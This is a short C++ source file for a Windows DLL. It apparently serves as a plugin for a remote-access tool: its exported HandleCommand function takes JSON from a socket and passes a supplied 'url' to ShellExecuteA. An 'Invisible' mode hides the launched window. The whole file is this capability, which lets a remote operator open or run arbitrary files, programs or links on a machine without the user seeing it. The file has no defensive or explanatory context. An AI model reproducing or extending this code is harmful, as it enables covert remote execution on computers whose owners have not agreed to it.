#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <shellapi.h>
#include <string>
#include "../../include/json.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "shell32.lib")

using json = nlohmann::json;
using namespace std;

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* json_data) {
    try {
        auto data = json::parse(json_data);
        string url = data.value("url", "");
        string mode = data.value("mode", "Visible");

        if (url.empty()) return;

        INT showMode = SW_SHOWNORMAL;
        if (mode == "Invisible") {
            showMode = SW_HIDE;
        }

        ShellExecuteA(NULL, "open", url.c_str(), NULL, NULL, showMode);
    } catch (...) {}
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
